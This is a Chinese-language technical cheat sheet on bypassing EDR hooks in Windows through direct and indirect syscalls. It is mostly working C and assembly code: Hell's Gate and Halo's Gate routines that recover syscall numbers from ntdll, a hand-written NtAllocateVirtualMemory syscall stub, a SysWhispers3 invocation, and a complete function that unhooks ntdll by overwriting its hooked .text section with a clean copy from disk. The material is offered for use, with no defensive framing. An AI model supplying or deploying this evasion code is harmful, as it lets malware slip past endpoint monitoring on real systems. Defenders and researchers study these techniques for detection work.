# 直接 Syscall 技术

## 原理

Windows 系统调用通过 ntdll 导出的 Nt* 函数进入内核。
EDR 通过 hook ntdll 的这些函数实现监控。
直接 syscall 跳过 ntdll hook，直接执行 syscall 指令。

## SSN 获取

### Hell's Gate
```c
// 从 ntdll 导出函数提取 SSN
// NtCreateThreadEx 的导出地址 → +4 字节 → syscall 指令 → 前 2 字节 = SSN

DWORD GetSSN(LPCSTR funcName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE* func = (BYTE*)GetProcAddress(ntdll, funcName);
    // 检查是否被 hook (前几个字节是否是 mov eax, SSN)
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1) {
        // 未 hook: 4C 8B D1 | B8 XX XX 00 00 | syscall
        DWORD ssn = *(DWORD*)(func + 4);
        return ssn;
    }
    return 0xFFFFFFFF; // 被 hook
}
```

### Halo's Gate
```c
// 如果目标函数被 hook，检查相邻函数（±1）
// 相邻 SSN 通常只差 1

DWORD GetSSNHalo(BYTE* func) {
    // 尝试当前位置
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1) {
        return *(DWORD*)(func + 4);
    }
    // 向下搜索
    for (int i = 1; i < 32; i++) {
        BYTE* next = func + i * 0x20; // 函数通常 32 字节对齐
        if (next[0] == 0x4C && next[1] == 0x8B && next[2] == 0xD1) {
            DWORD ssn = *(DWORD*)(next + 4);
            return ssn - i; // 推导
        }
    }
    // 向上搜索
    for (int i = 1; i < 32; i++) {
        BYTE* prev = func - i * 0x20;
        if (prev[0] == 0x4C && prev[1] == 0x8B && prev[2] == 0xD1) {
            DWORD ssn = *(DWORD*)(prev + 4);
            return ssn + i; // 推导
        }
    }
    return 0xFFFFFFFF;
}
```

## 间接 Syscall（更隐蔽）

```asm
; 间接 syscall: 通过 ntdll 中的 syscall 指令地址跳转
; 而非在自身代码中执行 syscall 指令

extrn syscall_addr:QWORD  ; ntdll 中某个 syscall 指令的地址

; 伪代码：
; 1. 把 SSN 放入 eax
; 2. 跳到 ntdll 的 syscall 指令地址执行
; syscall 指令在 ntdll 中，不会被标记为可疑
```

## C 语言实现

```c
#include <windows.h>
#include <stdio.h>

// 手动实现 NtAllocateVirtualMemory
EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

// 直接 syscall stub (x64)
// 编译时用 NASM 或内联汇编
__asm__(
    ".text\n"
    "NtAllocateVirtualMemory:\n"
    "    mov r10, rcx\n"
    "    mov eax, SSN_HERE\n"  // 替换为实际 SSN
    "    syscall\n"
    "    ret\n"
);

// 用 SysWhispers3 生成的更完整版本：
// python3 syswhispers3.py -f NtAllocateVirtualMemory -o output.h
```

## Unhook ntdll

```c
// 从磁盘读取干净的 ntdll，覆盖被 hook 的 .text 段
void UnhookNtdll() {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                               GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* cleanNtdll = (BYTE*)VirtualAlloc(NULL, fileSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, cleanNtdll, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // 找到 .text 段
    BYTE* hookedNtdll = (BYTE*)GetModuleHandleA("ntdll.dll");
    // PE 解析找 .text 段 offset 和 size
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)cleanNtdll;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(cleanNtdll + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)
        ((BYTE*)nt + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            DWORD textRVA = sections[i].VirtualAddress;
            DWORD textSize = sections[i].Misc.VirtualSize;
            DWORD oldProtect;
            VirtualProtect(hookedNtdll + textRVA, textSize,
                PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(hookedNtdll + textRVA,
                   cleanNtdll + sections[i].PointerToRawData,
                   textSize);
            VirtualProtect(hookedNtdll + textRVA, textSize,
                oldProtect, &oldProtect);
            break;
        }
    }
    VirtualFree(cleanNtdll, 0, MEM_RELEASE);
}
```
